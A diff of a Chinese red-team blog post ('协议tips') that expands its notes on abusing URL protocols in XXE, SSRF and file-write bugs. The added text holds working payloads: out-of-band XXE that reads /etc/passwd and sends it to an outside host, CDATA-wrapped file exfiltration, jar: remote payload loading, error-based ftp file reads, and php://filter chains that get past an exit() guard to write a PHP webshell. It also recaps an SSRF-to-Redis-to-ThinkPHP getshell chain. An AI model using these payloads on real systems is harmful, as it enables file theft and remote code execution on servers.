@@ -83,21 +83,22 @@
 
 
 
-<meta name="description" content="最近遇到的很多利用，无论是XXE、SSRF还是类似文件包含的任意文件读取，在实际利用过程中，无不和协议扯上关系。在debug过程中也遇到很多以前没注意的问题，特此记录一下。 XXEXXE一般是解析XML的时候调用了外部实体，通过外部实体读取内容回显出来或者通过向外的请求将数据带外。实体简单来说就是某种变量，通过dtd(文档类型定义)的定义去引用(dtd也能够定义element去规定整个xml标签的">
+<meta name="description" content="最近遇到的很多利用，无论是XXE、SSRF还是任意文件读取，在实际利用过程中，无不和协议扯上关系。在debug过程中也遇到很多以前没注意的问题，特此记录一下。 XXEXXE一般是解析XML的时候调用了外部实体，通过外部实体读取内容回显出来或者通过向外的请求将数据带外。实体简单来说就是某种变量，通过dtd(文档类型定义)的定义去引用(dtd也能够定义element去规定整个xml标签的结构) 123">
 <meta property="og:type" content="article">
 <meta property="og:title" content="协议tips">
 <meta property="og:url" content="http://a1ne.github.io/2020/04/02/%E5%8D%8F%E8%AE%AEtips/index.html">
 <meta property="og:site_name" content="Breezy&#39;s Blog">
-<meta property="og:description" content="最近遇到的很多利用，无论是XXE、SSRF还是类似文件包含的任意文件读取，在实际利用过程中，无不和协议扯上关系。在debug过程中也遇到很多以前没注意的问题，特此记录一下。 XXEXXE一般是解析XML的时候调用了外部实体，通过外部实体读取内容回显出来或者通过向外的请求将数据带外。实体简单来说就是某种变量，通过dtd(文档类型定义)的定义去引用(dtd也能够定义element去规定整个xml标签的">
+<meta property="og:description" content="最近遇到的很多利用，无论是XXE、SSRF还是任意文件读取，在实际利用过程中，无不和协议扯上关系。在debug过程中也遇到很多以前没注意的问题，特此记录一下。 XXEXXE一般是解析XML的时候调用了外部实体，通过外部实体读取内容回显出来或者通过向外的请求将数据带外。实体简单来说就是某种变量，通过dtd(文档类型定义)的定义去引用(dtd也能够定义element去规定整个xml标签的结构) 123">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://a1ne.github.io/images/Protocol/xxe_pro.png">
+<meta property="og:image" content="http://a1ne.github.io/images/protocol/xxe_pro.png">
 <meta property="og:image" content="http://a1ne.github.io/images/protocol/extension.png">
+<meta property="og:image" content="http://a1ne.github.io/images/protocol/base64.png">
 <meta property="article:published_time" content="2020-04-03T00:35:31.000Z">
-<meta property="article:modified_time" content="2020-04-03T01:34:43.163Z">
+<meta property="article:modified_time" content="2020-04-04T02:46:15.219Z">
 <meta property="article:author" content="Breezy">
 <meta property="article:tag" content="RedTeam">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://a1ne.github.io/images/Protocol/xxe_pro.png">
+<meta name="twitter:image" content="http://a1ne.github.io/images/protocol/xxe_pro.png">
 
 
 
@@ -189,17 +190,27 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/%20" rel="section">
+          <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-fa fa-home"></i> <br />
             
             Home
           </a>
         </li>
       
         
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fa fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
-          <a href="/archives/%20" rel="section">
+          <a href="/archives/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
@@ -307,20 +318,41 @@
       
 
       
-        <p>最近遇到的很多利用，无论是XXE、SSRF还是类似文件包含的任意文件读取，在实际利用过程中，无不和协议扯上关系。在debug过程中也遇到很多以前没注意的问题，特此记录一下。</p>
+        <p>最近遇到的很多利用，无论是XXE、SSRF还是任意文件读取，在实际利用过程中，无不和协议扯上关系。在debug过程中也遇到很多以前没注意的问题，特此记录一下。</p>
 <h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE一般是解析XML的时候调用了外部实体，通过外部实体读取内容回显出来或者通过向外的请求将数据带外。<br>实体简单来说就是某种变量，通过dtd(文档类型定义)的定义去引用(dtd也能够定义element去规定整个xml标签的结构)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r[                  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; dtd</span><br><span class="line">&lt;!ELEMENT r ANY &gt;               &#x2F;&#x2F;接受任意元素</span><br><span class="line">&lt;!ENTITY s &quot;test&quot;&gt;              &#x2F;&#x2F;实体</span><br><span class="line">]&gt;</span><br><span class="line">&lt;username&gt;&amp;s;&lt;username&#x2F;&gt;</span><br></pre></td></tr></table></figure>
 <p>上述的请求在解析过程中会将<code>username</code>字段的值替换成上面定义的<code>test</code><br>实体分为内部和外部，外部实体用于是引用外部的内容</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY s &quot;test&quot;&gt;       内部实体</span><br><span class="line">&lt;!ENTITY s SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;test.dtd&quot;&gt;   外部实体</span><br><span class="line"></span><br><span class="line">除了上述 外部实体的引入还可以使用公用dtd</span><br><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
 <p>除了外部和内部的区别，实体还分为通用实体和参数实体</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">通用实体</span><br><span class="line">通过&amp;xxx;引用的实体,DTD 中定义后在XML中引用</span><br><span class="line">&lt;!DOCTYPE r[&lt;!ENTITY s SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;public.dtd&quot;&gt;]&gt;</span><br><span class="line">&lt;username&gt;&amp;s;&lt;&#x2F;username&gt;</span><br><span class="line"></span><br><span class="line">参数实体</span><br><span class="line">通过%xxx;引用，只能在DTD中定义和使用，只有在外部dtd中参数实体定义才能引用其他实体</span><br><span class="line">&lt;!DOCTYPE r[</span><br><span class="line">&lt;!ENTITY % s SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;public.dtd&quot;&gt;</span><br><span class="line">%s;   -----&gt;引入外部dtd文件内容</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-<p>通过外部实体的引入可以使得不用频繁更新当前xml结构，但是引入的时候没有做限制，就可能导致结合协议的任意文件读取或ssrf。<br>最简单的场景就是一个登陆框，用xml形式传递用户名和密码。在请求后会将用户名回显出来<br>这时候就能够利用通用外部实体调用file协议读取敏感文件，然后通过响应的回显将文件内容显示出来，其他的协议类似，http、gopher、dict等协议可以实现进一步内网探测和攻击。<br>协议的支持偷一张小圆圆师傅(k0rz3n)的图</p>
-<p><img src="/images/Protocol/xxe_pro.png" alt="upload successful"><br>读文件时候文件特殊字符问题可以对应根据协议去绕过，最舒服的就是php伪协议，其他的java对应的jar协议能够实现文件的上传,或者phar协议RCE，但高版本的jdk移除了对gopher协议的支持，并且带外url中不支持<code>\n</code>，http协议和ftp协议(大部分版本)只能读取一行.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-encode&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.rot13&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D; 去除特殊标签&lt;?php exit();?&gt;特别好使</span><br><span class="line">里面的协议支持管道string.strip_tags|convert.base64-encode</span><br></pre></td></tr></table></figure>
+<p>通过外部实体的引入可以使得不用频繁更新当前xml结构，但是引入的时候没有做限制，就可能导致结合协议的任意文件读取或ssrf。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h4><p>最简单的场景就是一个登陆框，用xml形式传递用户名和密码。在请求后会将用户名回显出来。这时候就能够利用通用外部实体调用file协议读取敏感文件，然后通过响应的回显将文件内容显示出来，其他的协议类似，http、gopher、dict等协议可以实现进一步内网探测和攻击。<br>协议的支持偷一张小圆圆师傅(k0rz3n)的图</p>
+<p><img src="/images/protocol/xxe_pro.png" alt="xxe_pro"><br>读文件时候文件特殊字符问题可以对应根据协议去绕过，最舒服的就是php伪协议，其他的java对应的jar协议能够实现文件的上传,或者phar协议RCE，但高版本的jdk移除了对gopher协议的支持，并且带外url中不支持<code>\n</code>，http协议和ftp协议(大部分版本)只能读取一行.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.rot13&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D; 去除特殊标签&lt;?php exit();?&gt;特别好使</span><br><span class="line">里面的协议支持管道string.strip_tags|convert.base64-encode</span><br></pre></td></tr></table></figure>
 <p>php在安装扩展后还支持如下协议(同样盗图)</p>
 <p><img src="/images/protocol/extension.png" alt="extension"></p>
+<p>jar协议支持远程加载jar文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">格式:</span><br><span class="line">jar:url!&#x2F;path</span><br><span class="line">jar:http:&#x2F;&#x2F;breezy.com&#x2F;test.jar!&#x2F;payload&#x2F;shell</span><br><span class="line">!后面为jar包中实际文件</span><br><span class="line"></span><br><span class="line">调用jar协议会下载远程jar或zip包到本地(一般为xxxx.tmp)，提取出对应路径的文件后删除临时文件</span><br><span class="line">在提取jar包中不存在的文件时会爆出临时文件的路径,使用sleep或者添加特殊字符延长服务器读取文件删除的时间</span><br><span class="line">结合文件包含以及特殊的jar包构造可以实现getshell</span><br></pre></td></tr></table></figure>
+<h4 id="带外"><a href="#带外" class="headerlink" title="带外"></a>带外</h4><p>通常存在回显可以直接将通用实体引入到xml文档中进行输出，但是很多时候无回显，如果能够出网，就可以使用带外的方式，借助参数实体传输数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE r[</span><br><span class="line">&lt;!ENTITY % s SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % out SYSTEM &quot;http:&#x2F;&#x2F;breezy.com&#x2F;payload.dtd&quot;&gt;</span><br><span class="line">%out;       &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;等同于将http:&#x2F;&#x2F;breezy.com&#x2F;payload.dtd内容宏替换到dtd中</span><br><span class="line">%call;       &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;引入 &lt;!ENTITY m SYSTEM &#39;http:&#x2F;&#x2F;breezy.com&#x2F;outband.php?$&#123;&#x2F;etc&#x2F;passwd&#125;&#39;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"># http:&#x2F;&#x2F;breezy.com&#x2F;payload.dtd</span><br><span class="line">&lt;!ENTITY % call &quot;&lt;!ENTITY m SYSTEM &#39;http:&#x2F;&#x2F;breezy.com&#x2F;outband.php?%s;&#39;&gt;&quot;&gt; 参数实体只能通过外部dtd引用 本地引用会报错</span><br></pre></td></tr></table></figure>
+<p>通过上面的例子可以看出引用相当于将实体的内容直接放到dtd文档中进行定义，因为不能直接在内部dtd中定义引用，一般需要先对外请求dtd文件，在外部的dtd文件中定义文件内容的替换。</p>
+<p>除了常见的协议外，xml还支持一个特殊的标签<code>&lt;![CDATA[]]&gt;</code>，放在该标签内的内容会被转义成字符串处理。通过下述方式调用(因为需要引用内容，需要借助外部的dtd)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE r[</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;user.xml&quot;&gt;</span><br><span class="line">&lt;!ENTITY % END &quot;]]&quot;&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;http:&#x2F;&#x2F;breezy.com&#x2F;payload.dtd&quot;&gt;</span><br><span class="line">%file</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">#http:&#x2F;&#x2F;breezy.com&#x2F;payload.dtd</span><br><span class="line">&lt;!ENTITY result &quot;%start;%content;%end;&quot;&gt;</span><br><span class="line"></span><br><span class="line">xml中通过&amp;result;引入 </span><br><span class="line">如果需要带外则修改如下,并在上述dtd中加入对result的引用</span><br><span class="line">&lt;!ENTITY % result &quot;&lt;!ENTITY m SYSTEM &#39;http:&#x2F;&#x2F;breezy.com&#x2F;?%start;%content;%end;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><p>报错可能是比较少见的一种方式，其实类似报错注入的方式，简单来讲就是构造错误让结果在错误中输出<br>在实际利用过程中因为Java 环境，jdk版本较高，只允许读取一行内容，走投无路尝试了一下ftp协议，结果出乎意料就通过报错出来了，遗憾的是有特殊符号的文件不能读取。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;%data;xxxxx  直接将内容写到ftp协议请求地址最前面触发报错</span><br></pre></td></tr></table></figure>
+<p>其他的协议在特殊字段构造错误，可能也能够将文件内容放在错误流中输出出来</p>
+<h2 id="PHP-filter伪协议扩展"><a href="#PHP-filter伪协议扩展" class="headerlink" title="PHP filter伪协议扩展"></a>PHP filter伪协议扩展</h2><p>昨天看的一篇从艰难的ssrf到RCE,看了感觉绕来绕去，其实总结下来就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;ssrf 结合gopher协议利用低权限redis实现thinkphp 5.0.24任意文件写</span><br><span class="line"></span><br><span class="line">作者首先通过ssrf读取了thinkphp配置文件，发现存在的redis数据库</span><br><span class="line">redis未授权可以访问，gopher利用失败后dict协议发送info收集信息,结合pid在&#x2F;proc&#x2F;pid&#x2F;status获取到权限</span><br><span class="line">低权限计划任务和ssh authorized_keys不能写入，尝试写shell遇到dict协议不支持?写入</span><br><span class="line">用bitop op dst src1 src2(通过src1和src2 op操作位运算得到dst)尝试绕过失败</span><br><span class="line">随后尝试thinkphp的任意文件写，在redis获取数据代码以think_serialize触发</span><br><span class="line">触发点为file_put_contents($a.$random.&quot;.php&quot;,&quot;&lt;?php exit();?&gt;&quot;.$a)</span><br><span class="line">绕过php exit可以结合伪协议base64,rot13或者strip_tags</span><br><span class="line">作者在这里提供了按位反的两个用法 php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-4LE.UCS-4BE和php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE</span><br><span class="line">生成payload后取反后利用dict协议发送到redis使用bitop not取反恢复成功getshell</span><br></pre></td></tr></table></figure>
+<p>今天又有师傅关于上文出了后续，学到的一点是php伪协议的过滤器如果无效，则原样输出，所以在针对<code>file_put_contents($a,&quot;&lt;?php exit();?&gt;&quot;.$a)</code>的利用中可以将payload插入到过滤器中。<br>无效过滤器会提示警告，但不影响文件写入，其中base64过滤器因为遇到<code>=</code>会停止解析从而爆长度错误(<code>stream filter (convert.base64-decode): invalid byte sequence</code>)，手动填充长度还是失败，<code>write</code>和<code>read</code>的等号可以去掉，但是<code>resource</code>后的等号必须存在，看了大佬的分析，可以通过在<code>resource=</code>前后加上标签。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;string.strip_tags|convert.base64-decode|aaPD9waHAgcGhwaW5mbygpOz8+|&lt;&#x2F;resource&#x3D;&gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/protocol/base64.png" alt="base64"><br>用<code>string.strip_tags</code>去除这种文件名会比较奇怪，并且在widnows因为通配符的原因不能访问到，可以加上<code>../</code>的方式来跨一个不存在目录写进当前目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;string.strip_tags|convert.base64-decode|aaPD9waHAgcGhwaW5mbygpOz8+|&lt;&#x2F;resource&#x3D;&gt;test&#x2F;..&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+<p>其他的<code>rot13</code>以及按位反转类似<br>看作者更新的文章还有一种用法是utf-8转成utf-7的，可以去掉其中的<code>=</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
-<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a><br><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">9102年Java里的XXE</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a><br><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">9102年Java里的XXE</a><br><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之 XXE 漏洞</a><br><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/?nsukey=LuMh9W23UlxD1Q6nXIcNUsr9suqnF3TO0zRqdZPg%2BkD6Dk%2BU9fDfmHwYq7QHvk8TyGvslzMGZw2PsACk6SSraG6zW1zTDKG9x9Xs4rLfp95UPA0AICDXPf42GyyZvuNmcUZHQY1mhQCt4YkgdqoaKdEONoXVIfV%2BWnZWvvHcQGtJVVXEoVk82flPWyG3FxNfmVZY%2Bun0zBpVDS61gxjjjQ%3D%3D" target="_blank" rel="noopener">关于file_put_contents的一些小测试</a></p>
 </blockquote>
 
       
@@ -429,7 +461,7 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/%20%7C%7C%20archive">
+                <a href="/archives/%7C%7C%20archive">
               
                   <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
@@ -475,7 +507,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-number">1.</span> <span class="nav-text">XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-number">1.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">1.1.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#回显"><span class="nav-number">1.1.1.</span> <span class="nav-text">回显</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#带外"><span class="nav-number">1.1.2.</span> <span class="nav-text">带外</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错"><span class="nav-number">1.1.3.</span> <span class="nav-text">报错</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-filter伪协议扩展"><span class="nav-number">2.</span> <span class="nav-text">PHP filter伪协议扩展</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
             
 
           </div>
